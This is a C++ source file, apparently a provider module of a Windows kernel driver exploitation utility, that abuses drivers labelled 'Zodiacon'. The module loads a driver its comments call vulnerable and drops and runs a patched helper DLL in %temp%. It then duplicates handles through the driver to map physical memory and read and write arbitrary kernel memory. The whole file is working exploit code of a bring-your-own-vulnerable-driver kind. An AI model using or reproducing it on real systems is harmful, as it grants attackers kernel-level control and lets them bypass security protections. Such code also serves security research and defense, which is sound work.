/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       ZODIACON.CPP
*
*  VERSION:     1.32
*
*  DATE:        10 Jun 2022
*
*  Zodiacon driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/zodiacon.h"

HANDLE g_ZdcPhysicalMemorySection = NULL;

/*
* KObExpReadVirtualMemory
*
* Purpose:
*
* Read virtual memory via KObExp driver.
*
*/
BOOL WINAPI KObExpReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return supCallDriver(DeviceHandle, IOCTL_KOBEXP_READ_VMEM,
        &VirtualAddress,
        sizeof(VirtualAddress),
        Buffer,
        NumberOfBytes);
}

/*
* KObExpWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory via KObExp driver.
*
*/
BOOL WINAPI KObExpWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes
)
{
    return supCallDriver(DeviceHandle, IOCTL_KOBEXP_WRITE_VMEM,
        &VirtualAddress,
        sizeof(VirtualAddress),
        Buffer,
        NumberOfBytes);
}

#define ZdcMapMemory(PhysicalAddress, NumberOfBytes, MapForWrite) \
    supMapPhysicalMemory(g_ZdcPhysicalMemorySection, PhysicalAddress, NumberOfBytes, MapForWrite)

#define ZdcUnmapMemory(BaseAddress) supUnmapPhysicalMemory(BaseAddress)

#define ZdcReadWritePhysicalMemory(PhysicalAddress, Buffer, NumberOfBytes, DoWrite) \
    supReadWritePhysicalMemory(g_ZdcPhysicalMemorySection, PhysicalAddress, Buffer, NumberOfBytes, DoWrite)

/*
* ZdcReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI ZdcReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    UNREFERENCED_PARAMETER(DeviceHandle);

    return ZdcReadWritePhysicalMemory(PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* ZdcWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI ZdcWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    UNREFERENCED_PARAMETER(DeviceHandle);

    return ZdcReadWritePhysicalMemory(PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* ZdcQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI ZdcQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;
    ULONG cbRead = 0x100000;

    UNREFERENCED_PARAMETER(DeviceHandle);

    *Value = 0;

    SetLastError(ERROR_SUCCESS);

    pbLowStub1M = (ULONG_PTR)ZdcMapMemory(0ULL,
        cbRead,
        FALSE);

    if (pbLowStub1M) {

        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
        if (PML4)
            *Value = PML4;

        ZdcUnmapMemory((PVOID)pbLowStub1M);

    }

    return (PML4 != 0);
}

/*
* ZdcVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI ZdcVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        ZdcQueryPML4Value,
        ZdcReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* ZdcReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI ZdcReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    UNREFERENCED_PARAMETER(DeviceHandle);
    SetLastError(ERROR_SUCCESS);

    bResult = ZdcVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = ZdcReadWritePhysicalMemory(physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE);

    }

    return bResult;
}

/*
* ZdcWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI ZdcWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    UNREFERENCED_PARAMETER(DeviceHandle);
    SetLastError(ERROR_SUCCESS);

    bResult = ZdcVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = ZdcReadWritePhysicalMemory(physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE);

    }

    return bResult;
}

/*
* ZdcpOpenDriver
*
* Purpose:
*
* Open Zodiacon drivers with their locking features in mind.
*
*/
BOOL WINAPI ZdcpOpenDriver(
    _In_ PVOID Param
)
{
    BOOL bResult = FALSE;
    PVOID ipcServer = NULL;
    KDU_CONTEXT* Context = (PKDU_CONTEXT)Param;
    DWORD cch;
    ULONG resourceSize = 0;
    WCHAR szTemp[MAX_PATH + 1], szFileName[MAX_PATH * 2];
    LPWSTR lpCommand;
    LPWSTR lpTargetName;

    switch (Context->Provider->LoadData->ResourceId) {

    case IDR_KREGEXP:
        lpTargetName = (LPWSTR)ZODIACON_REGEXP_EXE;
        lpCommand = (LPWSTR)L"1";
        break;

    case IDR_KOBJEXP:
    default:
        lpCommand = (LPWSTR)L"0";
        lpTargetName = (LPWSTR)ZODIACON_SYSEXP_EXE;
        break;
    }

    RtlSecureZeroMemory(&szTemp, sizeof(szTemp));
    cch = supExpandEnvironmentStrings(L"%temp%", szTemp, MAX_PATH);
    if (cch == 0 || cch > MAX_PATH) {
        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        return FALSE;
    }

    PBYTE dllBuffer;

    dllBuffer = (PBYTE)KDULoadResource(IDR_TAIGEI64,
        GetModuleHandle(NULL),
        &resourceSize,
        PROVIDER_RES_KEY,
        TRUE);

    if (dllBuffer == NULL) {

        supPrintfEvent(kduEventError,
            "[!] Failed to load helper dll\r\n");

        return FALSE;

    }

    if (supReplaceDllEntryPoint(dllBuffer,
        resourceSize,
        (LPCSTR)"RegisterForProvider2",
        TRUE))
    {
        StringCchPrintf(szFileName, MAX_PATH * 2,
            TEXT("%ws\\%ws"),
            szTemp,
            lpTargetName);

        NTSTATUS ntStatus;

        if (supWriteBufferToFile(szFileName,
            dllBuffer,
            resourceSize,
            TRUE,
            FALSE,
            &ntStatus))
        {

            STARTUPINFO si;
            PROCESS_INFORMATION pi;

            RtlSecureZeroMemory(&si, sizeof(si));
            RtlSecureZeroMemory(&pi, sizeof(pi));

            si.cb = sizeof(si);
            GetStartupInfo(&si);

            if (CreateProcess(szFileName,
                lpCommand,
                NULL,
                NULL,
                TRUE,
                CREATE_SUSPENDED,
                NULL,
                szTemp,
                &si,
                &pi))
            {

                ipcServer = IpcStartApiServer(supIpcDuplicateHandleCallback,
                    supIpcOnException,
                    NULL,
                    NULL,
                    (PVOID)Context);

                ResumeThread(pi.hThread);
            }

            if (ipcServer) {
                WaitForSingleObject(pi.hProcess, INFINITE);
            }

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            bResult = (Context->DeviceHandle != NULL);

        }
        else {
            supShowHardError("[!] Failed to write help dll on disk", ntStatus);
        }

    }
    else {
        supPrintfEvent(kduEventError, "[!] Error while configuring helper dll\r\n");
    }

    supHeapFree(dllBuffer);

    return bResult;
}

/*
* ZdcDuplicateHandle2
*
* Purpose:
*
* Duplicate handle via Zodiacon driver request.
*
*/
BOOL ZdcDuplicateHandle2(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE SourceProcessId,
    _In_ HANDLE SourceProcessHandle,
    _In_ HANDLE SourceHandle,
    _Out_ PHANDLE TargetHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _In_ ULONG Options
)
{
    KZODIACON_DUP_DATA_V2 request;

    UNREFERENCED_PARAMETER(SourceProcessHandle);
    UNREFERENCED_PARAMETER(HandleAttributes);
    UNREFERENCED_PARAMETER(Options);

    RtlSecureZeroMemory(&request, sizeof(request));
    request.SourcePid = HandleToUlong(SourceProcessId);
    request.Handle = SourceHandle;
    request.AccessMask = DesiredAccess;
    request.Flags = DUPLICATE_SAME_ACCESS;

    *TargetHandle = NULL;

    return supCallDriver(DeviceHandle,
        IOCTL_KANYEXP_DUPLICATE_OBJECT,
        &request,
        sizeof(request),
        TargetHandle,
        sizeof(PVOID));
}

/*
* ZdcDuplicateHandle
*
* Purpose:
*
* Duplicate handle via Zodiacon driver request.
*
*/
BOOL ZdcDuplicateHandle(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE SourceProcessId,
    _In_ HANDLE SourceProcessHandle,
    _In_ HANDLE SourceHandle,
    _Out_ PHANDLE TargetHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _In_ ULONG Options
)
{
    KZODIACON_DUP_DATA request;

    UNREFERENCED_PARAMETER(SourceProcessHandle);
    UNREFERENCED_PARAMETER(HandleAttributes);
    UNREFERENCED_PARAMETER(Options);

    RtlSecureZeroMemory(&request, sizeof(request));
    request.SourcePid = HandleToUlong(SourceProcessId);
    request.Handle = HandleToUlong(SourceHandle);
    request.AccessMask = DesiredAccess;
    request.Flags = DUPLICATE_SAME_ACCESS;

    *TargetHandle = NULL;

    return supCallDriver(DeviceHandle,
        IOCTL_KANYEXP_DUPLICATE_OBJECT,
        &request,
        sizeof(request),
        TargetHandle,
        sizeof(PVOID));
}

/*
* ZdcRegisterDriver
*
* Purpose:
*
* Driver initialization routine.
*
*/
BOOL WINAPI ZdcRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    ULONG DriverId = PtrToUlong(Param);
    pfnDuplicateHandleCallback callback;

    //
    // Workaround for Yosifovich bugs.
    //

    switch (DriverId) {
    case IDR_KREGEXP:
        callback = ZdcDuplicateHandle2;
        break;
    default:
        callback = ZdcDuplicateHandle;
        break;
    }

    return supOpenPhysicalMemory2(DeviceHandle,
        callback,
        &g_ZdcPhysicalMemorySection);
}

/*
* ZdcUnregisterDriver
*
* Purpose:
*
* Free driver related resources.
*
*/
BOOL WINAPI ZdcUnregisterDriver(
    _In_ HANDLE DeviceHandle)
{
    UNREFERENCED_PARAMETER(DeviceHandle);

    if (g_ZdcPhysicalMemorySection) {
        NtClose(g_ZdcPhysicalMemorySection);
        g_ZdcPhysicalMemorySection = NULL;
    }

    return TRUE;
}

/*
* ZdcStartVulnerableDriver
*
* Purpose:
*
* Load/open vulnerable driver callback.
*
*/
BOOL ZdcStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL bLoaded = FALSE;
    NTSTATUS ntStatus;
    KDU_DB_ENTRY* provLoadData = Context->Provider->LoadData;
    LPWSTR lpDeviceName = provLoadData->DeviceName;
    LPWSTR lpDriverName = provLoadData->DriverName;
    LPWSTR lpFullFileName = Context->DriverFileName;

    //
    // Check if driver already loaded.
    //
    if (supIsObjectExists((LPWSTR)L"\\Device", lpDeviceName)) {

        supPrintfEvent(kduEventError,
            "[!] Vulnerable driver is already loaded\r\n");

        bLoaded = TRUE;
    }
    else {

        //
        // Driver is not loaded, load it.
        //
        if (!KDUProvExtractVulnerableDriver(Context))
            return FALSE;

        ntStatus = supLoadDriverEx(lpDriverName,
            lpFullFileName,
            FALSE,
            NULL,
            NULL);

        if (NT_SUCCESS(ntStatus)) {

            supPrintfEvent(kduEventInformation,
                "[+] Vulnerable driver \"%ws\" loaded\r\n", lpDriverName);

            bLoaded = TRUE;
        }
        else {
            supShowHardError("[!] Unable to load vulnerable driver", ntStatus);
            DeleteFile(lpFullFileName);
        }

    }

    if (bLoaded) {

        printf_s("[+] Acquiring handle for driver device \"%ws\" -> please wait, this can take a few seconds\r\n",
            provLoadData->DeviceName);

        if (ZdcpOpenDriver(Context)) {

            supPrintfEvent(kduEventInformation,
                "[+] Successfully acquired handle for driver device \"%ws\"\r\n",
                provLoadData->DeviceName);

        }
    }

    return (Context->DeviceHandle != NULL);
}
